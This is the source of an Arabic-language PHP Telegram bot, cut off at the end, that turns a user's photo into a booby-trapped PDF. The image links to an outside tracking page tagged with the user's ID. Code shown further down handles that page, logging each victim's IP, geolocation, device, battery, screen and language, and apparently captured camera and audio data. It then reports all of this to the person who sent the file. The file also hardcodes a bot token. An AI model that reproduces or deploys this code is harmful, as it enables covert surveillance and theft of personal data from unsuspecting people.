<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header("HTTP/1.1 403 Forbidden");
    exit("Access Denied 🚫");
}

ob_start();
$TOKEN = "7792699813:AAFyfnRgKLdWKtXoMPva5o0D8yuh9vKsUf4";
$admin = 8076394849;
define("API_KEY", $TOKEN);

function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . API_KEY . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res, true);
}

// --- FPDF Class ---
class FPDF
{
    protected $page, $n, $offsets, $buffer, $pages, $state, $compress, $k;
    protected $DefOrientation, $CurOrientation, $StdPageSizes, $DefPageSize;
    protected $CurPageSize, $CurRotation, $PageInfo, $wPt, $hPt, $w, $h;
    protected $lMargin, $tMargin, $rMargin, $bMargin, $cMargin, $x, $y, $lasth;
    protected $LineWidth, $fontpath, $CoreFonts, $fonts, $FontFiles;
    protected $encodings, $cmaps, $FontFamily, $FontStyle, $underline;
    protected $CurrentFont, $FontSizePt, $FontSize, $DrawColor, $FillColor;
    protected $TextColor, $ColorFlag, $WithAlpha, $ws, $images, $PageLinks;
    protected $links, $AutoPageBreak, $PageBreakTrigger, $InHeader, $InFooter;
    protected $AliasNbPages, $ZoomMode, $LayoutMode, $metadata, $PDFVersion;

    function __construct($orientation = 'P', $unit = 'mm', $size = 'A4')
    {
        $this->_dochecks();
        $this->state = 0;
        $this->page = 0;
        $this->n = 2;
        $this->buffer = '';
        $this->pages = array();
        $this->PageInfo = array();
        $this->fonts = array();
        $this->FontFiles = array();
        $this->encodings = array();
        $this->cmaps = array();
        $this->images = array();
        $this->links = array();
        $this->InHeader = false;
        $this->InFooter = false;
        $this->lasth = 0;
        $this->FontFamily = '';
        $this->FontStyle = '';
        $this->FontSizePt = 12;
        $this->underline = false;
        $this->DrawColor = '0 G';
        $this->FillColor = '0 g';
        $this->TextColor = '0 g';
        $this->ColorFlag = false;
        $this->WithAlpha = false;
        $this->ws = 0;

        if (defined('FPDF_FONTPATH')) {
            $this->fontpath = FPDF_FONTPATH;
            if (substr($this->fontpath, -1) != '/' && substr($this->fontpath, -1) != '\\')
                $this->fontpath .= '/';
        } elseif (is_dir(dirname(__FILE__) . '/font'))
            $this->fontpath = dirname(__FILE__) . '/font/';
        else
            $this->fontpath = '';

        $this->CoreFonts = array('courier', 'helvetica', 'times', 'symbol', 'zapfdingbats');

        if ($unit == 'pt')
            $this->k = 1;
        elseif ($unit == 'mm')
            $this->k = 72 / 25.4;
        elseif ($unit == 'cm')
            $this->k = 72 / 2.54;
        elseif ($unit == 'in')
            $this->k = 72;
        else
            $this->Error('Incorrect unit: ' . $unit);

        $this->StdPageSizes = array(
            'a3' => array(841.89, 1190.55),
            'a4' => array(595.28, 841.89),
            'a5' => array(420.94, 595.28),
            'letter' => array(612, 792),
            'legal' => array(612, 1008)
        );
        $size = $this->_getpagesize($size);
        $this->DefPageSize = $size;
        $this->CurPageSize = $size;

        $orientation = strtolower($orientation);
        if ($orientation == 'p' || $orientation == 'portrait') {
            $this->DefOrientation = 'P';
            $this->w = $size[0];
            $this->h = $size[1];
        } elseif ($orientation == 'l' || $orientation == 'landscape') {
            $this->DefOrientation = 'L';
            $this->w = $size[1];
            $this->h = $size[0];
        } else
            $this->Error('Incorrect orientation: ' . $orientation);

        $this->CurOrientation = $this->DefOrientation;
        $this->wPt = $this->w * $this->k;
        $this->hPt = $this->h * $this->k;
        $this->CurRotation = 0;

        $margin = 28.35 / $this->k;
        $this->SetMargins($margin, $margin);
        $this->cMargin = $margin / 10;
        $this->LineWidth = .567 / $this->k;
        $this->SetAutoPageBreak(true, 2 * $margin);
        $this->SetDisplayMode('default');
        $this->SetCompression(true);
        $this->PDFVersion = '1.3';
    }

    function SetMargins($left, $top, $right = null)
    {
        $this->lMargin = $left;
        $this->tMargin = $top;
        if ($right === null)
            $right = $left;
        $this->rMargin = $right;
    }

    function SetAutoPageBreak($auto, $margin = 0)
    {
        $this->AutoPageBreak = $auto;
        $this->bMargin = $margin;
        $this->PageBreakTrigger = $this->h - $margin;
    }

    function AddPage($orientation = '', $size = '', $rotation = 0)
    {
        if ($this->state == 3)
            $this->Error('The document is closed');
        $family = $this->FontFamily;
        $style = $this->FontStyle . ($this->underline ? 'U' : '');
        $fontsize = $this->FontSizePt;
        $lw = $this->LineWidth;
        $dc = $this->DrawColor;
        $fc = $this->FillColor;
        $tc = $this->TextColor;
        $cf = $this->ColorFlag;

        if ($this->page > 0) {
            $this->InFooter = true;
            $this->Footer();
            $this->InFooter = false;
            $this->_endpage();
        }

        $this->_beginpage($orientation, $size, $rotation);
        $this->_out('2 J');
        $this->LineWidth = $lw;
        $this->_out(sprintf('%.2F w', $lw * $this->k));

        if ($family)
            $this->SetFont($family, $style, $fontsize);
        $this->DrawColor = $dc;
        if ($dc != '0 G')
            $this->_out($dc);
        $this->FillColor = $fc;
        if ($fc != '0 g')
            $this->_out($fc);
        $this->TextColor = $tc;
        $this->ColorFlag = $cf;

        $this->InHeader = true;
        $this->Header();
        $this->InHeader = false;

        if ($this->LineWidth != $lw) {
            $this->LineWidth = $lw;
            $this->_out(sprintf('%.2F w', $lw * $this->k));
        }

        if ($family)
            $this->SetFont($family, $style, $fontsize);
        if ($this->DrawColor != $dc) {
            $this->DrawColor = $dc;
            $this->_out($dc);
        }
        if ($this->FillColor != $fc) {
            $this->FillColor = $fc;
            $this->_out($fc);
        }
        $this->TextColor = $tc;
        $this->ColorFlag = $cf;
    }

    function Header()
    {
    }
    function Footer()
    {
    }

    function SetFont($family, $style = '', $size = 0)
    {
        if ($family == '')
            $family = $this->FontFamily;
        else
            $family = strtolower($family);
        $style = strtoupper($style);
        if (strpos($style, 'U') !== false) {
            $this->underline = true;
            $style = str_replace('U', '', $style);
        } else
            $this->underline = false;
        if ($style == 'IB')
            $style = 'BI';
        if ($size == 0)
            $size = $this->FontSizePt;

        if ($this->FontFamily == $family && $this->FontStyle == $style && $this->FontSizePt == $size)
            return;

        $fontkey = $family . $style;
        if (!isset($this->fonts[$fontkey])) {
            if ($family == 'arial')
                $family = 'helvetica';
            if (in_array($family, $this->CoreFonts)) {
                if ($family == 'symbol' || $family == 'zapfdingbats')
                    $style = '';
                $fontkey = $family . $style;
                if (!isset($this->fonts[$fontkey]))
                    $this->AddFont($family, $style);
            } else
                $this->Error('Undefined font: ' . $family . ' ' . $style);
        }

        $this->FontFamily = $family;
        $this->FontStyle = $style;
        $this->FontSizePt = $size;
        $this->FontSize = $size / $this->k;
        $this->CurrentFont = &$this->fonts[$fontkey];
        if ($this->page > 0)
            $this->_out(sprintf('BT /F%d %.2F Tf ET', $this->CurrentFont['i'], $this->FontSizePt));
    }

    function Image($file, $x = null, $y = null, $w = 0, $h = 0, $type = '', $link = '')
    {
        if ($file == '')
            $this->Error('Image file name is empty');
        if (!isset($this->images[$file])) {
            if ($type == '') {
                $pos = strrpos($file, '.');
                if (!$pos)
                    $this->Error('Image file has no extension and no type was specified: ' . $file);
                $type = substr($file, $pos + 1);
            }
            $type = strtolower($type);
            if ($type == 'jpeg')
                $type = 'jpg';
            $mtd = '_parse' . $type;
            if (!method_exists($this, $mtd))
                $this->Error('Unsupported image type: ' . $type);
            $info = $this->$mtd($file);
            $info['i'] = count($this->images) + 1;
            $this->images[$file] = $info;
        } else
            $info = $this->images[$file];

        if ($w == 0 && $h == 0) {
            $w = -96;
            $h = -96;
        }
        if ($w < 0)
            $w = -$info['w'] * 72 / $w / $this->k;
        if ($h < 0)
            $h = -$info['h'] * 72 / $h / $this->k;
        if ($w == 0)
            $w = $h * $info['w'] / $info['h'];
        if ($h == 0)
            $h = $w * $info['h'] / $info['w'];

        if ($y === null) {
            if ($this->y + $h > $this->PageBreakTrigger && !$this->InHeader && !$this->InFooter && $this->AcceptPageBreak()) {
                $x2 = $this->x;
                $this->AddPage($this->CurOrientation, $this->CurPageSize, $this->CurRotation);
                $this->x = $x2;
            }
            $y = $this->y;
            $this->y += $h;
        }

        if ($x === null)
            $x = $this->x;
        $this->_out(sprintf('q %.2F 0 0 %.2F %.2F %.2F cm /I%d Do Q', $w * $this->k, $h * $this->k, $x * $this->k, ($this->h - ($y + $h)) * $this->k, $info['i']));
        if ($link)
            $this->Link($x, $y, $w, $h, $link);
    }

    function Link($x, $y, $w, $h, $link)
    {
        $this->PageLinks[$this->page][] = array($x * $this->k, $this->hPt - $y * $this->k, $w * $this->k, $h * $this->k, $link);
    }

    function Output($dest = '', $name = '', $isUTF8 = false)
    {
        $this->Close();
        if (strlen($name) == 1 && strlen($dest) != 1) {
            $tmp = $dest;
            $dest = $name;
            $name = $tmp;
        }
        if ($dest == '')
            $dest = 'I';
        if ($name == '')
            $name = 'doc.pdf';

        switch (strtoupper($dest)) {
            case 'I':
                $this->_checkoutput();
                if (PHP_SAPI != 'cli') {
                    header('Content-Type: application/pdf');
                    header('Content-Disposition: inline; ' . $this->_httpencode('filename', $name, $isUTF8));
                    header('Cache-Control: private, max-age=0, must-revalidate');
                    header('Pragma: public');
                }
                echo $this->buffer;
                break;
            case 'D':
                $this->_checkoutput();
                header('Content-Type: application/x-download');
                header('Content-Disposition: attachment; ' . $this->_httpencode('filename', $name, $isUTF8));
                header('Cache-Control: private, max-age=0, must-revalidate');
                header('Pragma: public');
                echo $this->buffer;
                break;
            case 'F':
                if (!file_put_contents($name, $this->buffer))
                    $this->Error('Unable to create output file: ' . $name);
                break;
            case 'S':
                return $this->buffer;
            default:
                $this->Error('Incorrect output destination: ' . $dest);
        }
        return '';
    }

    function Error($msg)
    {
        throw new Exception('FPDF error: ' . $msg);
    }

    // ... [الطرق المحمية الأخرى من FPDF] ...
    protected function _dochecks()
    {
        if (ini_get('mbstring.func_overload') & 2)
            $this->Error('mbstring overloading must be disabled');
    }

    protected function _getpagesize($size)
    {
        if (is_string($size)) {
            $size = strtolower($size);
            if (!isset($this->StdPageSizes[$size]))
                $this->Error('Unknown page size: ' . $size);
            $a = $this->StdPageSizes[$size];
            return array($a[0] / $this->k, $a[1] / $this->k);
        } else {
            if ($size[0] > $size[1])
                return array($size[1], $size[0]);
            else
                return $size;
        }
    }

    protected function _beginpage($orientation, $size, $rotation)
    {
        $this->page++;
        $this->pages[$this->page] = '';
        $this->state = 2;
        $this->x = $this->lMargin;
        $this->y = $this->tMargin;
        $this->FontFamily = '';

        if ($orientation == '')
            $orientation = $this->DefOrientation;
        else
            $orientation = strtoupper($orientation[0]);
        if ($size == '')
            $size = $this->DefPageSize;
        else
            $size = $this->_getpagesize($size);

        if ($orientation != $this->CurOrientation || $size[0] != $this->CurPageSize[0] || $size[1] != $this->CurPageSize[1]) {
            if ($orientation == 'P') {
                $this->w = $size[0];
                $this->h = $size[1];
            } else {
                $this->w = $size[1];
                $this->h = $size[0];
            }
            $this->wPt = $this->w * $this->k;
            $this->hPt = $this->h * $this->k;
            $this->PageBreakTrigger = $this->h - $this->bMargin;
            $this->CurOrientation = $orientation;
            $this->CurPageSize = $size;
        }

        if ($orientation != $this->DefOrientation || $size[0] != $this->DefPageSize[0] || $size[1] != $this->DefPageSize[1])
            $this->PageInfo[$this->page]['size'] = array($this->wPt, $this->hPt);

        if ($rotation != 0) {
            if ($rotation % 90 != 0)
                $this->Error('Incorrect rotation value: ' . $rotation);
            $this->CurRotation = $rotation;
            $this->PageInfo[$this->page]['rotation'] = $rotation;
        }
    }

    protected function _endpage()
    {
        $this->state = 1;
    }

    protected function _out($s)
    {
        if ($this->state == 2)
            $this->pages[$this->page] .= $s . "\n";
        elseif ($this->state == 1)
            $this->_put($s);
        elseif ($this->state == 0)
            $this->Error('No page has been added yet');
        elseif ($this->state == 3)
            $this->Error('The document is closed');
    }

    protected function _put($s)
    {
        $this->buffer .= $s . "\n";
    }

    protected function _parsejpg($file)
    {
        $a = getimagesize($file);
        if (!$a)
            $this->Error('Missing or incorrect image file: ' . $file);
        if ($a[2] != 2)
            $this->Error('Not a JPEG file: ' . $file);
        if (!isset($a['channels']) || $a['channels'] == 3)
            $colspace = 'DeviceRGB';
        elseif ($a['channels'] == 4)
            $colspace = 'DeviceCMYK';
        else
            $colspace = 'DeviceGray';
        $bpc = isset($a['bits']) ? $a['bits'] : 8;
        $data = file_get_contents($file);
        return array('w' => $a[0], 'h' => $a[1], 'cs' => $colspace, 'bpc' => $bpc, 'f' => 'DCTDecode', 'data' => $data);
    }

    protected function Close()
    {
        if ($this->state == 3)
            return;
        if ($this->page == 0)
            $this->AddPage();
        $this->InFooter = true;
        $this->Footer();
        $this->InFooter = false;
        $this->_endpage();
        $this->_enddoc();
    }

    protected function _enddoc()
    {
        $this->_putheader();
        $this->_putpages();
        $this->_putresources();
        $this->_newobj();
        $this->_put('<<');
        $this->_putinfo();
        $this->_put('>>');
        $this->_put('endobj');
        $this->_newobj();
        $this->_put('<<');
        $this->_putcatalog();
        $this->_put('>>');
        $this->_put('endobj');
        $offset = $this->_getoffset();
        $this->_put('xref');
        $this->_put('0 ' . ($this->n + 1));
        $this->_put('0000000000 65535 f ');
        for ($i = 1; $i <= $this->n; $i++)
            $this->_put(sprintf('%010d 00000 n ', $this->offsets[$i]));
        $this->_put('trailer');
        $this->_put('<<');
        $this->_puttrailer();
        $this->_put('>>');
        $this->_put('startxref');
        $this->_put($offset);
        $this->_put('%%EOF');
        $this->state = 3;
    }

    protected function _putheader()
    {
        $this->_put('%PDF-' . $this->PDFVersion);
    }
    protected function _puttrailer()
    {
        $this->_put('/Size ' . ($this->n + 1));
        $this->_put('/Root ' . $this->n . ' 0 R');
        $this->_put('/Info ' . ($this->n - 1) . ' 0 R');
    }
    protected function _putinfo()
    {
        $this->metadata['Producer'] = 'FPDF ' . FPDF_VERSION;
        $this->metadata['CreationDate'] = 'D:' . @date('YmdHis');
        foreach ($this->metadata as $key => $value)
            $this->_put('/' . $key . ' ' . $this->_textstring($value));
    }
    protected function _putcatalog()
    {
        $n = $this->PageInfo[1]['n'];
        $this->_put('/Type /Catalog');
        $this->_put('/Pages 1 0 R');
        if ($this->ZoomMode == 'fullpage')
            $this->_put('/OpenAction [' . $n . ' 0 R /Fit]');
        elseif ($this->ZoomMode == 'fullwidth')
            $this->_put('/OpenAction [' . $n . ' 0 R /FitH null]');
        elseif ($this->ZoomMode == 'real')
            $this->_put('/OpenAction [' . $n . ' 0 R /XYZ null null 1]');
        elseif (!is_string($this->ZoomMode))
            $this->_put('/OpenAction [' . $n . ' 0 R /XYZ null null ' . sprintf('%.2F', $this->ZoomMode / 100) . ']');
        if ($this->LayoutMode == 'single')
            $this->_put('/PageLayout /SinglePage');
        elseif ($this->LayoutMode == 'continuous')
            $this->_put('/PageLayout /OneColumn');
        elseif ($this->LayoutMode == 'two')
            $this->_put('/PageLayout /TwoColumnLeft');
    }
    protected function _getoffset()
    {
        return strlen($this->buffer);
    }
    protected function _newobj($n = null)
    {
        if ($n === null)
            $n = ++$this->n;
        $this->offsets[$n] = $this->_getoffset();
        $this->_put($n . ' 0 obj');
    }
    protected function _putpages()
    {
        $nb = $this->page;
        for ($n = 1; $n <= $nb; $n++)
            $this->PageInfo[$n]['n'] = $this->n + 1 + 2 * ($n - 1);
        for ($n = 1; $n <= $nb; $n++)
            $this->_putpage($n);
        $this->_newobj(1);
        $this->_put('<</Type /Pages');
        $kids = '/Kids [';
        for ($n = 1; $n <= $nb; $n++)
            $kids .= $this->PageInfo[$n]['n'] . ' 0 R ';
        $this->_put($kids . ']');
        $this->_put('/Count ' . $nb);
        if ($this->DefOrientation == 'P') {
            $w = $this->DefPageSize[0];
            $h = $this->DefPageSize[1];
        } else {
            $w = $this->DefPageSize[1];
            $h = $this->DefPageSize[0];
        }
        $this->_put(sprintf('/MediaBox [0 0 %.2F %.2F]', $w * $this->k, $h * $this->k));
        $this->_put('>>');
        $this->_put('endobj');
    }
    protected function _putpage($n)
    {
        $this->_newobj();
        $this->_put('<</Type /Page');
        $this->_put('/Parent 1 0 R');
        if (isset($this->PageInfo[$n]['size']))
            $this->_put(sprintf('/MediaBox [0 0 %.2F %.2F]', $this->PageInfo[$n]['size'][0], $this->PageInfo[$n]['size'][1]));
        if (isset($this->PageInfo[$n]['rotation']))
            $this->_put('/Rotate ' . $this->PageInfo[$n]['rotation']);
        $this->_put('/Resources 2 0 R');
        if (isset($this->PageLinks[$n])) {
            $annots = '/Annots [';
            foreach ($this->PageLinks[$n] as $pl) {
                $rect = sprintf('%.2F %.2F %.2F %.2F', $pl[0], $pl[1], $pl[0] + $pl[2], $pl[1] - $pl[3]);
                $annots .= '<</Type /Annot /Subtype /Link /Rect [' . $rect . '] /Border [0 0 0] ';
                if (is_string($pl[4]))
                    $annots .= '/A <</S /URI /URI ' . $this->_textstring($pl[4]) . '>>>>';
                else {
                    $l = $this->links[$pl[4]];
                    if (isset($this->PageInfo[$l[0]]['size']))
                        $h = $this->PageInfo[$l[0]]['size'][1];
                    else
                        $h = ($this->DefOrientation == 'P') ? $this->DefPageSize[1] * $this->k : $this->DefPageSize[0] * $this->k;
                    $annots .= sprintf('/Dest [%d 0 R /XYZ 0 %.2F null]>>', $this->PageInfo[$l[0]]['n'], $h - $l[1] * $this->k);
                }
            }
            $this->_put($annots . ']');
        }
        if ($this->WithAlpha)
            $this->_put('/Group <</Type /Group /S /Transparency /CS /DeviceRGB>>');
        $this->_put('/Contents ' . ($this->n + 1) . ' 0 R>>');
        $this->_put('endobj');
        if (!empty($this->AliasNbPages))
            $this->pages[$n] = str_replace($this->AliasNbPages, $this->page, $this->pages[$n]);
        $this->_putstreamobject($this->pages[$n]);
    }
    protected function _putstreamobject($data)
    {
        if ($this->compress) {
            $entries = '/Filter /FlateDecode ';
            $data = gzcompress($data);
        } else
            $entries = '';
        $entries .= '/Length ' . strlen($data);
        $this->_newobj();
        $this->_put('<<' . $entries . '>>');
        $this->_putstream($data);
        $this->_put('endobj');
    }
    protected function _putstream($data)
    {
        $this->_put('stream');
        $this->_put($data);
        $this->_put('endstream');
    }
    protected function _escape($s)
    {
        if (strpos($s, '(') !== false || strpos($s, ')') !== false || strpos($s, '\\') !== false || strpos($s, "\r") !== false)
            return str_replace(array('\\', '(', ')', "\r"), array('\\\\', '\\(', '\\)', '\\r'), $s);
        else
            return $s;
    }
    protected function _textstring($s)
    {
        if (!$this->_isascii($s))
            $s = $this->_UTF8toUTF16($s);
        return '(' . $this->_escape($s) . ')';
    }
    protected function _isascii($s)
    {
        $nb = strlen($s);
        for ($i = 0; $i < $nb; $i++) {
            if (ord($s[$i]) > 127)
                return false;
        }
        return true;
    }
    protected function SetCompression($compress)
    {
        if (function_exists('gzcompress'))
            $this->compress = $compress;
        else
            $this->compress = false;
    }
    protected function SetDisplayMode($zoom, $layout = 'default')
    {
        if ($zoom == 'fullpage' || $zoom == 'fullwidth' || $zoom == 'real' || $zoom == 'default' || !is_string($zoom))
            $this->ZoomMode = $zoom;
        else
            $this->Error('Incorrect zoom display mode: ' . $zoom);
        if ($layout == 'single' || $layout == 'continuous' || $layout == 'two' || $layout == 'default')
            $this->LayoutMode = $layout;
        else
            $this->Error('Incorrect layout display mode: ' . $layout);
    }
    protected function AcceptPageBreak()
    {
        return $this->AutoPageBreak;
    }
}

// --- استقبال التحديث ---
$update = json_decode(file_get_contents("php://input"));
$message = $update->message ?? null;
$callback = $update->callback_query ?? null;
$chat_id = $message->chat->id ?? $callback->message->chat->id ?? null;
$from_id = $message->from->id ?? $callback->from->id ?? null;
$username = $message->from->username ?? $callback->from->username ?? "غير معروف";
$text = $message->text ?? null;
$data = $callback->data ?? null;

$name = $message->from->first_name ?? "مجهول";
$user = $username ?: "غير معروف";

// --- إعدادات القنوات الإجبارية ---
$channels = [
    "@Kalfatoth_7x" => "ArkHacking",
    "@VIP_40l" => "Info"
];

function notJoinedChannels($chat_id, $channels)
{
    $notJoined = [];
    foreach ($channels as $ch => $title) {
        $check = bot("getChatMember", ["chat_id" => $ch, "user_id" => $chat_id]);
        $status = $check["result"]["status"] ?? "";
        if (!in_array($status, ["member", "administrator", "creator"])) {
            $notJoined[] = ["username" => str_replace("@", "", $ch), "title" => $title];
        }
    }
    return $notJoined;
}

function isMember($chat_id, $channels)
{
    foreach ($channels as $ch => $title) {
        $check = bot("getChatMember", ["chat_id" => $ch, "user_id" => $chat_id]);
        $status = $check["result"]["status"] ?? "";
        if (!in_array($status, ["member", "administrator", "creator"]))
            return false;
    }
    return true;
}

// --- القائمة الرئيسية ---
$home = [
    [["text" => "☠️ 𓏺 تلغيم صوره 𓏺 ☠️", "callback_data" => "make_pdf"]],
    [["text" => "➕ إضافة قنوات إجبارية", "callback_data" => "add_channels"]],
    [["text" => "• تواصل مع المطور •", "url" => "tg://user?id=$admin"]],
];

// --- لوحة الأدمن ---
$admin_panel = [
    [['text' => "المشتركين 👥", 'callback_data' => "Allison"]],
    [["text" => "⚙️ إدارة القنوات الإجبارية", "callback_data" => "manage_channels"]],
    [["text" => "📊 إحصائيات البوت", "callback_data" => "stats"]],
];

// --- معالجة الأوامر ---
if ($from_id == $admin && $text == "/start") {
    bot("sendMessage", [
        "chat_id" => $chat_id,
        "text" => "🦞 اهلا عزيزي المطور! اليك لوحة التحكم 🦞\n\n⚙️ — — — — — — — — — — — — — — ⚙️",
        "reply_markup" => json_encode(["inline_keyboard" => $admin_panel])
    ]);
}

if (strpos($text, "/start") === 0) {
    $notJoined = notJoinedChannels($chat_id, $channels);

    if (!empty($notJoined)) {
        $buttons = [];
        foreach ($notJoined as $ch) {
            $buttons[] = [["text" => "{$ch['title']}", "url" => "https://t.me/{$ch['username']}"]];
        }
        $buttons[] = [["text" => "✅ تحقق من الاشتراك", "callback_data" => "check_subscription"]];

        bot("sendMessage", [
            "chat_id" => $chat_id,
            "text" => "🔰 *للاستفادة من مميزات البوت يجب الاشتراك في القنوات التالية:*\n\n" .
                "✨ بالاشتراك ستحصل على:\n" .
                "- تحديثات سريعة 📰\n" .
                "- مميزات حصرية 🎁\n" .
                "- نصائح احترافية 💡\n\n" .
                "اشترك ثم اضغط على زر التحقق ✅",
            "parse_mode" => "Markdown",
            "reply_markup" => json_encode(["inline_keyboard" => $buttons])
        ]);
        exit;
    }

    $welcome = "💥🚀 *أهلاً بك في بوت تلغيم الصور* 🎭\n\n" .
        "🔹 هذا البوت يتيح لك تلغيم صورة و تحويلها إلى ملف PDF ملغم ✨\n\n" .
        "👤 *المستخدم:* @$username\n" .
        "🆔 *الايدي:* `$from_id`\n\n" .
        "💠 *خطوات الاستخدام:*\n\n" .
        "1- اضغط على زر تلغيم صورة\n" .
        "2- أرسل الصورة المراد تلغيمها\n\n" .
        "سيقوم البوت بإنشاء ملف PDF يحتوي على صورتك الملغمه ...";

    bot("sendMessage", [
        "chat_id" => $chat_id,
        "text" => $welcome,
        "parse_mode" => "Markdown",
        "reply_markup" => json_encode(["inline_keyboard" => $home])
    ]);
}

// --- معالجة الكلابك ---
if ($data) {
    // زر التحقق من الاشتراك
    if ($data == "check_subscription") {
        $notJoined = notJoinedChannels($chat_id, $channels);

        if (empty($notJoined)) {
            $welcome = "💥🚀 *أهلاً بك في بوت تلغيم الصور* 🎭\n\n" .
                "🔹 هذا البوت يتيح لك تلغيم صورة و تحويلها إلى ملف PDF ملغم ✨\n\n" .
                "👤 *المستخدم:* @$username\n" .
                "🆔 *الايدي:* `$from_id`\n\n" .
                "💠 *خطوات الاستخدام:*\n\n" .
                "1- اضغط على زر تلغيم صورة\n" .
                "2- أرسل الصورة المراد تلغيمها\n\n" .
                "سيقوم البوت بإنشاء ملف PDF يحتوي على صورتك الملغمه ...";

            bot("editMessageText", [
                "chat_id" => $chat_id,
                "message_id" => $callback->message->message_id,
                "text" => $welcome,
                "parse_mode" => "Markdown",
                "reply_markup" => json_encode(["inline_keyboard" => $home])
            ]);
        } else {
            bot("answerCallbackQuery", [
                "callback_query_id" => $callback->id,
                "text" => "❌ لم تشترك في جميع القنوات بعد!",
                "show_alert" => true
            ]);
        }
    }

    // زر إضافة قنوات إجبارية
    if ($data == "add_channels") {
        $channel_list = "📢 *القنوات الإجبارية الحالية:*\n\n";
        $i = 1;
        foreach ($channels as $channel => $title) {
            $channel_list .= "$i- [$title](https://t.me/$channel)\n";
            $i++;
        }

        $channel_list .= "\n🔰 *للاستفادة من البوت يجب الاشتراك في جميع القنوات أعلاه*";

        bot("editMessageText", [
            "chat_id" => $chat_id,
            "message_id" => $callback->message->message_id,
            "text" => $channel_list,
            "parse_mode" => "Markdown",
            "reply_markup" => json_encode([
                "inline_keyboard" => [
                    [["text" => "✅ تحقق من الاشتراك", "callback_data" => "check_subscription"]],
                    [["text" => "🔙 رجوع", "callback_data" => "back_home"]]
                ]
            ])
        ]);
    }

    // زر تلغيم الصورة
    if ($data == "make_pdf") {
        // التحقق من الاشتراك أولاً
        if (!isMember($chat_id, $channels)) {
            bot("answerCallbackQuery", [
                "callback_query_id" => $callback->id,
                "text" => "❌ يجب الاشتراك في القنوات أولاً!",
                "show_alert" => true
            ]);
            return;
        }

        file_put_contents("step_$from_id.txt", "waiting_image");
        bot("editMessageText", [
            "chat_id" => $chat_id,
            "message_id" => $callback->message->message_id,
            "text" => "📷 *أرسل الآن الصورة التي تريد تلغيمها و تحويلها إلى ملف PDF:*"
        ]);
    }

    // زر الرجوع
    if ($data == "back_home") {
        $welcome = "💥🚀 *أهلاً بك في بوت تلغيم الصور* 🎭\n\n" .
            "🔹 هذا البوت يتيح لك تلغيم صورة و تحويلها إلى ملف PDF ملغم ✨\n\n" .
            "👤 *المستخدم:* @$username\n" .
            "🆔 *الايدي:* `$from_id`\n\n" .
            "💠 *خطوات الاستخدام:*\n\n" .
            "1- اضغط على زر تلغيم صورة\n" .
            "2- أرسل الصورة المراد تلغيمها\n\n" .
            "سيقوم البوت بإنشاء ملف PDF يحتوي على صورتك الملغمه ...";

        bot("editMessageText", [
            "chat_id" => $chat_id,
            "message_id" => $callback->message->message_id,
            "text" => $welcome,
            "parse_mode" => "Markdown",
            "reply_markup" => json_encode(["inline_keyboard" => $home])
        ]);
    }

    // إحصائيات الأدمن
    if ($data == "stats" && $from_id == $admin) {
        $m = explode("\n", file_get_contents("database/ID.txt"));
        $total_users = count($m) - 1;

        $stats_text = "📊 *إحصائيات البوت*\n\n" .
            "👥 *إجمالي المستخدمين:* $total_users\n" .
            "📢 *عدد القنوات الإجبارية:* " . count($channels) . "\n" .
            "🔄 *آخر تحديث:* " . date('Y-m-d H:i:s');

        bot("editMessageText", [
            "chat_id" => $chat_id,
            "message_id" => $callback->message->message_id,
            "text" => $stats_text,
            "parse_mode" => "Markdown",
            "reply_markup" => json_encode(["inline_keyboard" => $admin_panel])
        ]);
    }
}

// --- معالجة الصور للتلغيم ---
$step = file_exists("step_$from_id.txt") ? file_get_contents("step_$from_id.txt") : "";

if ($step == "waiting_image" && isset($message->photo)) {
    // التحقق من الاشتراك
    if (!isMember($chat_id, $channels)) {
        bot("sendMessage", [
            "chat_id" => $chat_id,
            "text" => "❌ يجب الاشتراك في القنوات أولاً!"
        ]);
        unlink("step_$from_id.txt");
        exit;
    }

    $photo = end($message->photo);
    $file_id = $photo->file_id;
    $get = bot("getFile", ["file_id" => $file_id]);
    $file_path = $get["result"]["file_path"];
    $photo_url = "https://api.telegram.org/file/bot" . API_KEY . "/" . $file_path;
    file_put_contents("photo.jpg", file_get_contents($photo_url));

    $link = "https://camillecyrm.serv00.net/je/bt.php?id=$from_id";
    $pdf = new FPDF();
    $pdf->AddPage();
    $pdf->Image("photo.jpg", 10, 20, 190);
    $pdf->Link(10, 20, 190, 190, $link);
    $pdf->Output("F", "file.pdf");

    bot("sendDocument", [
        "chat_id" => $chat_id,
        "document" => new CURLFile("file.pdf"),
        "caption" => "📄 تم تلغيم الصورة وتحويلها إلى PDF 🔗"
    ]);

    // إشعار للمطور
    bot("sendMessage", [
        "chat_id" => $admin,
        "text" => "🔔 *إشعار : تم تلغيم صورة جديدة!*\n\n" .
            "👤 المستخدم : @$user\n" .
            "🆔 الايدي : `$from_id`",
        "parse_mode" => "Markdown"
    ]);

    unlink("photo.jpg");
    unlink("file.pdf");
    unlink("step_$from_id.txt");
}

// --- معالجة طلبات التلغيم ---
if (isset($_GET['action']) && $_GET['action'] == 'bt') {
    $BOT_TOKEN = $TOKEN;
    $ADMIN_ID = $_GET['id'] ?? null;

    if ($ADMIN_ID && empty($_POST)) {
        $currentTime = date('Y-m-d H:i:s');
        $instantMsg = "👤 تم فتح ملف PDF من قبل المستخدم !\n\n🕒 التاريخ : $currentTime";
        file_get_contents("https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$ADMIN_ID&text=" . urlencode($instantMsg));
    }

    if (isset($_POST['battery']) && isset($_POST['device']) && isset($_POST['time']) && $ADMIN_ID) {
        $battery = $_POST['battery'];
        $device = $_POST['device'];
        $userTime = $_POST['time'];
        $language = $_POST['lang'] ?? 'غير معروف';
        $screenRes = $_POST['screen'] ?? 'غير معروف';
        $referrer = $_POST['ref'] ?: 'غير معروف';
        $photoData = $_POST['photo'] ?? null;
        $audioData = $_POST['audio'] ?? null;
        $dataType = $_POST['data_type'] ?? 'photo';

        $ip = $_SERVER['REMOTE_ADDR'] ?? 'غير معروف';
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'غير معروف';

        $country = 'غير معروف';
        $isp = 'غير معروف';
        $ipData = @json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
        if ($ipData && $ipData['status'] === 'success') {
            $country = $ipData['country'] . " - " . $ipData['city'];
